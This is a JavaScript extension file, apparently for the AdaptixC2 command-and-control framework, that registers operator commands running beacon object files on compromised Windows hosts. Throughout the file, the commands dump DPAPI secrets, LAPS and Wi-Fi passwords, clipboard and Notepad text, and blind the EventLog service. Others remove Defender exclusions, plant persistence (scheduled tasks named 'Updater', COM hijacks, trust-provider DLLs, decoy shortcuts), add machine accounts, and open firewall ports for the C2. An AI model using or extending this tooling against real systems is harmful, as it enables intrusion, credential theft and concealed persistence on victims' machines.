cmd_regsave.addArgString("hive", true, "Hive: HKLM, HKCU, HKU");
cmd_regsave.addArgString("path", true, "Key path");
cmd_regsave.addArgString("output", true, "Destination file");
cmd_regsave.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["hive"], parsed_json["path"], parsed_json["output"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "regsave")}" ${params}`, "BOF: regsave");
});

var cmd_dpapissystem = ax.create_command("bof-dpapissystem", "Read the DPAPI_SYSTEM LSA secret (SYSTEM)", "bof-dpapissystem");
cmd_dpapissystem.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "dpapissystem")}"`, "BOF: dpapissystem");
});

var cmd_certdump = ax.create_command("bof-certdump", "List certificates and SHA1 thumbprints", "bof-certdump user");
cmd_certdump.addArgString("store", "user, machine, or empty for both", "");
cmd_certdump.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["store"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "certdump")}" ${params}`, "BOF: certdump");
});

var cmd_clipboard = ax.create_command("bof-clipboard", "Dump current clipboard text", "bof-clipboard");
cmd_clipboard.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "clipboard")}"`, "BOF: clipboard");
});

var cmd_notethief = ax.create_command("bof-notethief", "Recover text from open Notepad windows", "bof-notethief");
cmd_notethief.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "notethief")}"`, "BOF: notethief");
});

var cmd_screenshot = ax.create_command("bof-screenshot", "Capture the desktop to a BMP file", "bof-screenshot C:\\Temp\\screen.bmp");
cmd_screenshot.addArgString("path", "Output file (empty = %TEMP%\\bof_shot.bmp)", "");
cmd_screenshot.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["path"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "screenshot")}" ${params}`, "BOF: screenshot");
});

var cmd_enumfiles = ax.create_command("bof-enumfiles", "Recursive file search by pattern and keyword", "bof-enumfiles C:\\Users *.txt password");
cmd_enumfiles.addArgString("root", true, "Root directory");
cmd_enumfiles.addArgString("pattern", true, "Wildcard pattern, e.g. *.txt");
cmd_enumfiles.addArgString("keyword", "Content keyword (empty = any)", "");
cmd_enumfiles.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["root"], parsed_json["pattern"], parsed_json["keyword"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "enumfiles")}" ${params}`, "BOF: enumfiles");
});

var cmd_blindeventlog = ax.create_command("bof-blindeventlog", "Suspend or resume EventLog service threads", "bof-blindeventlog suspend");
cmd_blindeventlog.addArgString("op", "suspend or resume", "suspend");
cmd_blindeventlog.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["op"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "blindeventlog")}" ${params}`, "BOF: blindeventlog");
});

var cmd_enumexclusions = ax.create_command("bof-enumexclusions", "List Defender exclusions", "bof-enumexclusions paths");
cmd_enumexclusions.addArgString("type", "paths, extensions, processes, or empty for all", "");
cmd_enumexclusions.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", ["enum", parsed_json["type"], ""]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "defender")}" ${params}`, "BOF: defender enum");
});

var cmd_delexclusion = ax.create_command("bof-delexclusion", "Remove a Defender exclusion", "bof-delexclusion paths C:\\Temp");
cmd_delexclusion.addArgString("type", true, "paths, extensions or processes");
cmd_delexclusion.addArgString("value", true, "Exclusion value to remove");
cmd_delexclusion.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", ["del", parsed_json["type"], parsed_json["value"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "defender")}" ${params}`, "BOF: defender del");
});

var cmd_enableefs = ax.create_command("bof-enableefs", "Start the EFS service", "bof-enableefs");
cmd_enableefs.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "enableefs")}"`, "BOF: enableefs");
});

var cmd_ldapsearch = ax.create_command("bof-ldapsearch", "Generic LDAP search against the local DC", "bof-ldapsearch (objectClass=user) cn,sAMAccountName");
cmd_ldapsearch.addArgString("filter", true, "LDAP filter");
cmd_ldapsearch.addArgString("attrs", "Comma-separated attributes (empty = all)", "");
cmd_ldapsearch.addArgString("base", "Search base (empty = defaultNamingContext)", "");
cmd_ldapsearch.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["filter"], parsed_json["attrs"], parsed_json["base"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "ldapsearch")}" ${params}`, "BOF: ldapsearch");
});

var cmd_addmachineaccount = ax.create_command("bof-addmachineaccount", "Add a computer object via LDAP", "bof-addmachineaccount EVILPC01");
cmd_addmachineaccount.addArgString("name", true, "Computer name (without $)");
cmd_addmachineaccount.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["name"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "addmachineaccount")}" ${params}`, "BOF: addmachineaccount");
});

var cmd_lapsdump = ax.create_command("bof-lapsdump", "Read LAPS passwords from AD", "bof-lapsdump");
cmd_lapsdump.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "lapsdump")}"`, "BOF: lapsdump");
});

var cmd_klist = ax.create_command("bof-klist", "List cached Kerberos tickets", "bof-klist");
cmd_klist.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "klist")}"`, "BOF: klist");
});

var cmd_kerbhash = ax.create_command("bof-kerbhash", "Derive RC4/AES Kerberos keys from a password", "bof-kerbhash Password123 alice CORP.LOCAL");
cmd_kerbhash.addArgString("password", true, "Cleartext password");
cmd_kerbhash.addArgString("user", "Username (for AES salt)", "");
cmd_kerbhash.addArgString("realm", "Realm (for AES salt)", "");
cmd_kerbhash.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["password"], parsed_json["user"], parsed_json["realm"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "kerbhash")}" ${params}`, "BOF: kerbhash");
});

function svc_hook(op) {
    return function (id, cmdline, parsed_json) {
        let params = ax.bof_pack("cstr,cstr,cstr", [op, parsed_json["service"], parsed_json["starttype"] || ""]);
        ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "svcctl")}" ${params}`, "BOF: svcctl " + op);
    };
}

var cmd_svcconfig = ax.create_command("bof-sc-config", "Change a service start type", "bof-sc-config Spooler disabled");
cmd_svcconfig.addArgString("service", true, "Service name");
cmd_svcconfig.addArgString("starttype", true, "boot, system, auto, demand or disabled");
cmd_svcconfig.setPreHook(svc_hook("config"));

var cmd_svcstart = ax.create_command("bof-sc-start", "Start a service", "bof-sc-start Spooler");
cmd_svcstart.addArgString("service", true, "Service name");
cmd_svcstart.addArgString("starttype", "Unused", "");
cmd_svcstart.setPreHook(svc_hook("start"));

var cmd_svcstop = ax.create_command("bof-sc-stop", "Stop a service", "bof-sc-stop Spooler");
cmd_svcstop.addArgString("service", true, "Service name");
cmd_svcstop.addArgString("starttype", "Unused", "");
cmd_svcstop.setPreHook(svc_hook("stop"));

/* ---- catalog aliases ------------------------------------------------ */

var cmd_netgrouplist = ax.create_command("bof-netgrouplist", "Domain groups (alias of bof-domaingroups)", "bof-netgrouplist CORP");
cmd_netgrouplist.addArgString("domain", "Domain name (empty = current)", "");
cmd_netgrouplist.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "domaingroups")}" ${params}`, "BOF: domaingroups");
});

var cmd_netgrouplistmembers = ax.create_command("bof-netgrouplistmembers", "Domain group members (alias)", "bof-netgrouplistmembers \"Domain Admins\" CORP");
cmd_netgrouplistmembers.addArgString("group", true, "Group name");
cmd_netgrouplistmembers.addArgString("domain", "Domain name (empty = current)", "");
cmd_netgrouplistmembers.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["group"], parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netgroupmembers")}" ${params}`, "BOF: netgroupmembers");
});

var cmd_netgrouplistmembers2 = ax.create_command("bof-netgrouplistmembers2", "Domain group members (BOFHound alias)", "bof-netgrouplistmembers2 \"Domain Admins\"");
cmd_netgrouplistmembers2.addArgString("group", true, "Group name");
cmd_netgrouplistmembers2.addArgString("domain", "Domain name (empty = current)", "");
cmd_netgrouplistmembers2.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["group"], parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netgroupmembers")}" ${params}`, "BOF: netgroupmembers");
});

var cmd_netlocalgrouplist = ax.create_command("bof-netlocalgrouplist", "Local groups (alias of bof-netlocalgroups)", "bof-netlocalgrouplist 192.168.1.10");
cmd_netlocalgrouplist.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_netlocalgrouplist.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netlocalgroups")}" ${params}`, "BOF: netlocalgroups");
});

var cmd_netlocalgrouplistmembers = ax.create_command("bof-netlocalgrouplistmembers", "Local group members (alias)", "bof-netlocalgrouplistmembers Administrators");
cmd_netlocalgrouplistmembers.addArgString("group", true, "Local group name");
cmd_netlocalgrouplistmembers.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_netlocalgrouplistmembers.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["group"], parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netlocalgroupmembers")}" ${params}`, "BOF: netlocalgroupmembers");
});

var cmd_netuse_add = ax.create_command("bof-netuse_add", "Map a share (alias of bof-netuse)", "bof-netuse_add \\\\10.0.0.5\\C$ CORP\\user pass");
cmd_netuse_add.addArgString("share", true, "UNC path");
cmd_netuse_add.addArgString("user", "Username", "");
cmd_netuse_add.addArgString("password", "Password", "");
cmd_netuse_add.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["share"], parsed_json["user"], parsed_json["password"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netuse")}" ${params}`, "BOF: netuse");
});

var cmd_portscanbof = ax.create_command("bof-portscanbof", "TCP port scan (alias of bof-portscan)", "bof-portscanbof 10.0.0.5 22,80,443");
cmd_portscanbof.addArgString("host", true, "Hostname or IP");
cmd_portscanbof.addArgString("ports", true, "Ports: 22,80,8000-8100");
cmd_portscanbof.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["host"], parsed_json["ports"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "portscan")}" ${params}`, "BOF: portscan");
});

var cmd_netsession2 = ax.create_command("bof-netsession2", "SMB sessions (BOFHound alias)", "bof-netsession2 192.168.1.10");
cmd_netsession2.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_netsession2.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netsession")}" ${params}`, "BOF: netsession");
});

var cmd_get_password_policy = ax.create_command("bof-get_password_policy", "Password policy (alias)", "bof-get_password_policy CORP");
cmd_get_password_policy.addArgString("domain", "Domain or host (empty = local)", "");
cmd_get_password_policy.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "passwordpolicy")}" ${params}`, "BOF: passwordpolicy");
});

function hash_hook(algo) {
    return function (id, cmdline, parsed_json) {
        let params = ax.bof_pack("cstr,cstr", [parsed_json["path"], algo]);
        ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "hashfile")}" ${params}`, "BOF: hashfile " + algo);
    };
}

var cmd_md5 = ax.create_command("bof-md5", "MD5 a file (alias of bof-hashfile)", "bof-md5 C:\\Windows\\System32\\ntdll.dll");
cmd_md5.addArgString("path", true, "File path");
cmd_md5.setPreHook(hash_hook("md5"));

var cmd_sha1 = ax.create_command("bof-sha1", "SHA1 a file (alias of bof-hashfile)", "bof-sha1 C:\\Windows\\System32\\ntdll.dll");
cmd_sha1.addArgString("path", true, "File path");
cmd_sha1.setPreHook(hash_hook("sha1"));

var cmd_sha256 = ax.create_command("bof-sha256", "SHA256 a file (alias of bof-hashfile)", "bof-sha256 C:\\Windows\\System32\\ntdll.dll");
cmd_sha256.addArgString("path", true, "File path");
cmd_sha256.setPreHook(hash_hook("sha256"));

var cmd_get_priv = ax.create_command("bof-get_priv", "Enable a token privilege (alias)", "bof-get_priv SeDebugPrivilege");
cmd_get_priv.addArgString("privilege", true, "Privilege name");
cmd_get_priv.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["privilege"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "tokenpriv")}" ${params}`, "BOF: tokenpriv");
});

var cmd_enumdrives = ax.create_command("bof-enumdrives", "List drives (alias of bof-drives)", "bof-enumdrives");
cmd_enumdrives.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "drives")}"`, "BOF: drives");
});

var cmd_enumlib = ax.create_command("bof-enumlib", "List process modules (alias of bof-listmods)", "bof-enumlib 1234");
cmd_enumlib.addArgInt("pid", "Process ID (0 = current)", 0);
cmd_enumlib.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("int", [parsed_json["pid"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "listmods")}" ${params}`, "BOF: listmods");
});

var cmd_dumpwifi = ax.create_command("bof-dumpwifi", "Dump Wi-Fi profiles (alias of bof-wifi)", "bof-dumpwifi");
cmd_dumpwifi.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "wifi")}"`, "BOF: wifi");
});

var cmd_wifipasswords = ax.create_command("bof-wifipasswords", "Dump Wi-Fi passwords (alias of bof-wifi)", "bof-wifipasswords");
cmd_wifipasswords.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "wifi")}"`, "BOF: wifi");
});

/* ------------------------------------------------------------------ */
/* Tier 1 native additions                                             */
/* ------------------------------------------------------------------ */

var cmd_cacls = ax.create_command("bof-cacls", "Show owner and DACL for a file or directory", "bof-cacls C:\\Windows\\System32");
cmd_cacls.addArgString("path", true, "File or directory path");
cmd_cacls.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["path"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "cacls")}" ${params}`, "BOF: cacls");
});

var cmd_geolocation = ax.create_command("bof-geolocation", "Show region, country and timezone (offline)", "bof-geolocation");
cmd_geolocation.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "geolocation")}"`, "BOF: geolocation");
});

var cmd_evtxsearch = ax.create_command("bof-evtxsearch", "Query an event log channel and render XML", "bof-evtxsearch Security \"*[System[(EventID=4624)]]\" 5");
cmd_evtxsearch.addArgString("channel", true, "Channel, for example Security or System");
cmd_evtxsearch.addArgString("xpath", "XPath filter (empty = all events)", "");
cmd_evtxsearch.addArgString("max", "Maximum events to print", "10");
cmd_evtxsearch.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["channel"], parsed_json["xpath"], parsed_json["max"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "evtxsearch")}" ${params}`, "BOF: evtxsearch");
});

var cmd_finduserhooks = ax.create_command("bof-finduserhooks", "Flag hooked export prologues in user-mode modules", "bof-finduserhooks ntdll.dll");
cmd_finduserhooks.addArgString("module", "Module name (empty = common modules)", "");
cmd_finduserhooks.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["module"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "finduserhooks")}" ${params}`, "BOF: finduserhooks");
});

var cmd_enumhandles = ax.create_command("bof-enumhandles", "Show per-process handle counts", "bof-enumhandles");
cmd_enumhandles.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "enumhandles")}"`, "BOF: enumhandles");
});

var cmd_processhandles = ax.create_command("bof-processhandles", "List handles held by a process", "bof-processhandles 1234");
cmd_processhandles.addArgInt("pid", true, "Process ID");
cmd_processhandles.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("int", [parsed_json["pid"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "processhandles")}" ${params}`, "BOF: processhandles");
});

var cmd_killprocess = ax.create_command("bof-killprocess", "Terminate a process by PID", "bof-killprocess 1234");
cmd_killprocess.addArgInt("pid", true, "Process ID");
cmd_killprocess.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("int", [parsed_json["pid"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "killprocess")}" ${params}`, "BOF: killprocess");
});

var cmd_vssenum = ax.create_command("bof-vssenum", "Enumerate VSS snapshots or providers", "bof-vssenum list");
cmd_vssenum.addArgString("mode", "list or providers", "list");
cmd_vssenum.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "vssenum")}" ${params}`, "BOF: vssenum");
});

var cmd_wfpenum = ax.create_command("bof-wfpenum", "Enumerate WFP filters and sublayers", "bof-wfpenum all");
cmd_wfpenum.addArgString("mode", "filters, sublayers or all", "all");
cmd_wfpenum.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "wfpenum")}" ${params}`, "BOF: wfpenum");
});

var cmd_nbtscan = ax.create_command("bof-nbtscan", "NetBIOS node status scan", "bof-nbtscan 10.0.0.5,10.0.0.6");
cmd_nbtscan.addArgString("hosts", true, "Comma-separated hosts or IPs");
cmd_nbtscan.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["hosts"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "nbtscan")}" ${params}`, "BOF: nbtscan");
});

var cmd_adcs_enum = ax.create_command("bof-adcs_enum", "Enumerate ADCS CAs, templates and enrollment services", "bof-adcs_enum all");
cmd_adcs_enum.addArgString("mode", "all, templates, services or ca", "all");
cmd_adcs_enum.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "adcs_enum")}" ${params}`, "BOF: adcs_enum");
});

var cmd_ldapsecuritycheck = ax.create_command("bof-ldapsecuritycheck", "Check LDAP signing and channel-binding hardening", "bof-ldapsecuritycheck");
cmd_ldapsecuritycheck.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "ldapsecuritycheck")}"`, "BOF: ldapsecuritycheck");
});

var cmd_schtasksenum = ax.create_command("bof-schtasksenum", "Enumerate scheduled tasks (hidden included)", "bof-schtasksenum");
cmd_schtasksenum.addArgString("folder", "Task folder path", "\\");
cmd_schtasksenum.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", ["enum", parsed_json["folder"], "", ""]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "schtasks")}" ${params}`, "BOF: schtasks enum");
});

var cmd_schtasksquery = ax.create_command("bof-schtasksquery", "Show one scheduled task and its XML", "bof-schtasksquery \\Microsoft\\Windows\\Defrag\\ScheduledDefrag");
cmd_schtasksquery.addArgString("task", true, "Task path");
cmd_schtasksquery.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", ["query", parsed_json["task"], "", ""]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "schtasks")}" ${params}`, "BOF: schtasks query");
});

var cmd_schtaskscreate = ax.create_command("bof-schtaskscreate", "Create a logon-triggered scheduled task", "bof-schtaskscreate Updater C:\\Windows\\System32\\cmd.exe /c calc.exe");
cmd_schtaskscreate.addArgString("name", true, "Task name");
cmd_schtaskscreate.addArgString("command", true, "Executable to run");
cmd_schtaskscreate.addArgString("arguments", "Command arguments", "");
cmd_schtaskscreate.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", ["create", parsed_json["name"], parsed_json["command"], parsed_json["arguments"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "schtasks")}" ${params}`, "BOF: schtasks create");
});

var cmd_schtasksdelete = ax.create_command("bof-schtasksdelete", "Delete a scheduled task", "bof-schtasksdelete Updater");
cmd_schtasksdelete.addArgString("task", true, "Task path");
cmd_schtasksdelete.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", ["delete", parsed_json["task"], "", ""]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "schtasks")}" ${params}`, "BOF: schtasks delete");
});

var cmd_schtasksrun = ax.create_command("bof-schtasksrun", "Run a scheduled task on demand", "bof-schtasksrun Updater");
cmd_schtasksrun.addArgString("task", true, "Task path");
cmd_schtasksrun.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", ["run", parsed_json["task"], "", ""]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "schtasks")}" ${params}`, "BOF: schtasks run");
});

var cmd_addtaskscheduler = ax.create_command("bof-AddTaskScheduler", "Create a scheduled task (alias of bof-schtaskscreate)", "bof-AddTaskScheduler Updater C:\\Windows\\System32\\cmd.exe /c calc.exe");
cmd_addtaskscheduler.addArgString("name", true, "Task name");
cmd_addtaskscheduler.addArgString("command", true, "Executable to run");
cmd_addtaskscheduler.addArgString("arguments", "Command arguments", "");
cmd_addtaskscheduler.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", ["create", parsed_json["name"], parsed_json["command"], parsed_json["arguments"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "schtasks")}" ${params}`, "BOF: schtasks create");
});

var cmd_deltaskscheduler = ax.create_command("bof-DelTaskScheduler", "Delete a scheduled task (alias of bof-schtasksdelete)", "bof-DelTaskScheduler Updater");
cmd_deltaskscheduler.addArgString("task", true, "Task path");
cmd_deltaskscheduler.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", ["delete", parsed_json["task"], "", ""]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "schtasks")}" ${params}`, "BOF: schtasks delete");
});

var cmd_comhunter = ax.create_command("bof-comhunter", "Find hijackable COM registrations or set user-hive overrides", "bof-comhunter find");
cmd_comhunter.addArgString("operation", "find, list, add, remove or treatas", "find");
cmd_comhunter.addArgString("arg1", "CLSID, substring or DLL depending on operation", "");
cmd_comhunter.addArgString("arg2", "DLL, server CLSID or unused", "");
cmd_comhunter.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["operation"], parsed_json["arg1"], parsed_json["arg2"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "comhunter")}" ${params}`, "BOF: comhunter");
});

var cmd_trustme = ax.create_command("bof-trustme", "Manage trust-provider persistence (list/add/remove)", "bof-trustme list");
cmd_trustme.addArgString("operation", "list, add or remove", "list");
cmd_trustme.addArgString("dll", "DLL to register (add)", "");
cmd_trustme.addArgString("function", "Exported entry point (add)", "");
cmd_trustme.addArgString("guid", "Provider GUID (optional for add, required for remove)", "");
cmd_trustme.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", [parsed_json["operation"], parsed_json["dll"], parsed_json["function"], parsed_json["guid"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "trustme")}" ${params}`, "BOF: trustme");
});

var cmd_addlocalcert = ax.create_command("bof-addlocalcert", "Create a self-signed cert and add it to a MY store", "bof-addlocalcert machine CN=AdaptixBOFKit");
cmd_addlocalcert.addArgString("store", "user or machine", "machine");
cmd_addlocalcert.addArgString("subject", "X500 subject", "CN=AdaptixBOFKit");
cmd_addlocalcert.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["store"], parsed_json["subject"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "addlocalcert")}" ${params}`, "BOF: addlocalcert");
});

var cmd_addfirewallrule = ax.create_command("bof-addfirewallrule", "Add, remove or list Windows Firewall rules", "bof-addfirewallrule add AdaptixC2 443 tcp allow");
cmd_addfirewallrule.addArgString("operation", "add, remove or list", "add");
cmd_addfirewallrule.addArgString("name", true, "Rule name");
cmd_addfirewallrule.addArgString("port", "Local port (add)", "");
cmd_addfirewallrule.addArgString("protocol", "tcp, udp or any", "tcp");
cmd_addfirewallrule.addArgString("action", "allow or block", "allow");
cmd_addfirewallrule.addArgString("program", "Optional program path", "");
cmd_addfirewallrule.addArgString("direction", "in or out", "in");
cmd_addfirewallrule.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,cstr,cstr", [
        parsed_json["operation"], parsed_json["name"], parsed_json["port"],
        parsed_json["protocol"], parsed_json["action"], parsed_json["program"],
        parsed_json["direction"]
    ]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "addfirewallrule")}" ${params}`, "BOF: addfirewallrule");
});

var cmd_lnkgenerator = ax.create_command("bof-lnkgenerator", "Create a Windows shortcut (.lnk)", "bof-lnkgenerator C:\\Users\\Public\\Update.lnk C:\\Windows\\System32\\cmd.exe /c calc.exe");
cmd_lnkgenerator.addArgString("lnk", true, "Output .lnk path");
cmd_lnkgenerator.addArgString("target", true, "Shortcut target");
cmd_lnkgenerator.addArgString("arguments", "Target arguments", "");
cmd_lnkgenerator.addArgString("workdir", "Working directory", "");
cmd_lnkgenerator.addArgString("description", "Shortcut description", "");
cmd_lnkgenerator.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr", [
        parsed_json["lnk"], parsed_json["target"], parsed_json["arguments"],
        parsed_json["workdir"], parsed_json["description"]
    ]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "lnkgenerator")}" ${params}`, "BOF: lnkgenerator");
});

var cmd_executesession = ax.create_command("bof-executesession", "Launch a process in another session via WTS token", "bof-executesession 2 C:\\Windows\\System32\\cmd.exe");
cmd_executesession.addArgInt("session", true, "Target session ID");
cmd_executesession.addArgString("command", true, "Command line");
cmd_executesession.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("int,cstr", [parsed_json["session"], parsed_json["command"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "executesession")}" ${params}`, "BOF: executesession");
});

/* ---- Tier 1 catalog aliases ---------------------------------------- */

var cmd_startwebclient = ax.create_command("bof-startwebclient", "Start the WebClient (WebDAV) service", "bof-startwebclient");
cmd_startwebclient.setPreHook(function (id, cmdline) {
    let params = ax.bof_pack("cstr,cstr,cstr", ["start", "WebClient", ""]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "svcctl")}" ${params}`, "BOF: svcctl start");
});

var cmd_enumhandles_alias = ax.create_command("bof-EnumHandles", "Per-process handle counts (alias of bof-enumhandles)", "bof-EnumHandles");
cmd_enumhandles_alias.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "enumhandles")}"`, "BOF: enumhandles");
});

var cmd_processhandles_alias = ax.create_command("bof-ProcessListHandles", "List handles in a process (alias of bof-processhandles)", "bof-ProcessListHandles 1234");
cmd_processhandles_alias.addArgInt("pid", true, "Process ID");
cmd_processhandles_alias.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("int", [parsed_json["pid"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "processhandles")}" ${params}`, "BOF: processhandles");
});

var cmd_adcs_enum_com = ax.create_command("bof-adcs_enum_com", "Enumerate ADCS CAs and templates (alias)", "bof-adcs_enum_com all");
cmd_adcs_enum_com.addArgString("mode", "all, templates, services or ca", "all");
cmd_adcs_enum_com.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "adcs_enum")}" ${params}`, "BOF: adcs_enum");
});

